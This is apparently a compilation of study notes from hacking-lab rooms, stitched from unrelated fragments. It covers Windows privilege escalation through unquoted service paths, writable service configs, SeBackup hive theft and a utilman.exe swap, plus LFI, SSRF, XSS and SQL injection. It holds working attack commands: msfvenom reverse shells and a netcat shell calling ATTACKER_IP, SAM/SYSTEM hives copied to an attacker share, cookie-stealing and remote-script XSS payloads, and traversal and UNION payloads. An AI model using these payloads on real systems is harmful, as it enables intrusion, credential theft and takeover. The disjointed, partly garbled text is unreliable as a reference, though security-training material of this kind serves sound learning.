        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

        

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		


This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:
Command Prompt

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

        

The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446

        

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to C:\MyPrograms\Disk.exe. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
Command Prompt

C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.

        

Once the service gets restarted, your payload should execute:
Command Prompt

C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"

        

As a result, you'll get a reverse shell with svcusr2 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:
Command Prompt

C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

        

Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447

        

We will then transfer the reverse shell executable to the target machine and store it in C:\Users\thm-unpriv\rev-svc3.exe. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
Command Prompt

C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

        

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
Command Prompt

C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

        

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
Command Prompt

C:\> sc stop THMService
C:\> sc start THMService

        

And we will receive a shell back in our attacker's machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447

Abusing dangerous privileges
Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

whoami /priv

A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.


SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

User: THMBackup

Password: CopyMaster555

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

        

To backup the SAM and SYSTEM hashes, we can use the following commands:
Command Prompt

C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

        

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
Kali Linux

user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
        

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
Command Prompt

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

Log in to the target machine via RDP using the following credentials:

User: THMTakeOwnership

Password: TheWorldIsMine2022

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION

============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

        

We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

utilman normal behaviour

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
Command Prompt

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

        

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
Command Prompt

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

        

After this, we will replace utilman.exe with a copy of cmd.exe:
Command Prompt

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

        

To trigger utilman, we will lock our screen from the start button:

lock screen

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

utilman shell


SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

FTP server without impersonation

There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

FTP server with impersonation

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://10.10.199.94/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

Webshell impersonate privileges

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
Kali Linux

user@attackerpc$ nc -lvp 4442

        

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

RogueWinRM exploit execution

Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442

automated tools 
WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
Command Prompt

           
C:\> winpeas.exe > outputfile.txt

        

WinPEAS can be downloaded here.


PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded here.

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
Powershell

           
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

        


WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here.

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
Kali Linux

user@kali$ wes.py systeminfo.txt


Metasploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network

psexec.py user:'password'@10.10.32.51

Lcd specifies the default directory on your workstation—the directory in which smbclient looks for the files you want to send and puts the files you've received. Cd specifies the default directory for the server. So, if you're connected to a share that contains a directory named mail, from which you want to copy some files to a directory named /mymailfiles on your local Linux box, you can set those directories as the default directories by typing

  cd mail
  lcd /mymailfiles

Here's one final hint about using smbclient. Sometime you might need to use smbclient on someone else's Linux system. If the system's owner has never used smbclient and hasn't created the smb.conf file, Linux can't check smb.conf for the WINS server's location, and consequently smbclient often can't find the Win2K or NT server that you're trying to connect to. (For an explanation of the smb.conf file, see "Connecting Linux Workstations to Windows 2000 and NT Servers.")

You can, of course, create an smb.conf file. But if you don't want to do that much work, you can lead smbclient by the nose to your Win2K or NT server with the -W and -I options. The -W option lets you enter a domain's name, and the -I option lets you specify the server's IP address. So, using my earlier example, if I knew that \\BIGSERVE had an IP address of 200.200.200.10 and that my usermark account was in the domain GUYS, I could invoke smbclient with the command

smbclient //bigserve/plans -I   200.200.200.10 -W guys -U usermark%swordfish

This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called breakpoints. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.

#Robots.txt
The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.

#Sitemap.xml
Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.

The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s.

This service can help uncover old pages that may still be active on the current website.

#S3 Buckets
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

#Logic flaws
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.


The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
curl 'http://10.10.70.209/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

#Hashing
#encoding
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.


Take the below data as an example which is set by the web server upon logging in:

Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.

#LFI
Examples wih PHP
1. It works because there isn't a directory specified in the include function and no input validation.
http://webapp.thm/get.php?file=/etc/passwd
<?PHP 
	include($_GET["lang"]);
?>

2. If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.
<?PHP 
	include("languages/". $_GET['lang']); 
?>

3. Using null bytes
Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
The %00 trick is fixed and not working with PHP 5.3.4 and above.

4.In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00

5. The developer starts to use input validation by filtering some keywords. The web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass,

6. The developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd

========
#RFI
An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

host vcs.fsf.org
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa

ssh -oHostKeyAlgorithms=+ssh-dss -i id_rsa root@<ip>
  OpenSSH since 7.0 doesn't accept hostkey ssh-dss and you must add it, similarly since 8.8 it doesn't use client ssh-rsa and you must add that with -oPubkeyAcceptedAlgorithms=+ssh-rsa.

2. Path traversal

3. Server subdomain to wich the request is made
    http://website.thme/stock?server=api.website.thm/api/user&x=&id=123
    the payload ending in &x= is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a paramter (?x=) on the query string

4. Change a value like in an avatar election with a payload like x/../private being private a directory interesting

#Defeating common SSRF 
Deny list
Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.

Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254


Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

    The fetch() command makes an HTTP request.
    {URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
    ?cookie= is the query string that will contain the victim's cookies.

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
  <script>user.changeEmail('attacker@hacker.thm');</script>

-----
Stored XSS
the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:
  A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

-----
Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
xsshunter is a popular tool

-----
Reflected XSS
Example scenario
  A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
  https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>


-----
Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

Example Scenario:
  The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().

SQL
A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite

Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch

It's worth noting that SQL syntax is not case sensitive.

Inside mysql (with credentials). An example
mysql -u wordpress -p 
show databases;
use phpmyadmin;
show tables;
describe usernames_table;

Example:
  select * from users;
    The semicolon at the end tells the database that this is the end of the query.  

  select * from users LIMIT 1;
    This query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

  select * from users where username='admin';

  select * from users where username like 'a%';
    This returns any rows with username beginning with the letter a.

  select * from users where username like '%n';
    This returns any rows with username ending with the letter n.

  select * from users where username like '%mi%';
    This returns any rows with a username containing the characters mi within them.

  SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
    The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. 

  insert into users (username,password) values ('bob','password123');
    The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns

  update users SET username='root',password='pass123' where username='admin';
    The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

  delete from users where username='martin';
    The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

  SELECT * from blog where id=1 and private=0 LIMIT 1;
    the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match


-=-=-=-=-=-
SQLi
   Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
  https://website.thm/blog?id=2;--

  Which would then, in turn, produce the SQL statement:
  SELECT * from blog where id=2;-- and private=0 LIMIT 1;
  The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

  SELECT * from blog where id=2;--
  Which will return the article with an id of 2 whether it is set to public or notes

-----
In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection
  This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

  The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

  Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 

  The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:
  1 UNION SELECT 1

  This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:
  1 UNION SELECT 1,2

  Same error again, so let's repeat by adding another column:
  1 UNION SELECT 1,2,3

  Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.
  0 UNION SELECT 1,2,3

  You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:
  0 UNION SELECT 1,2,database()
  You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.

  Our next query will gather a list of tables that are in this database.
  0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

  There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


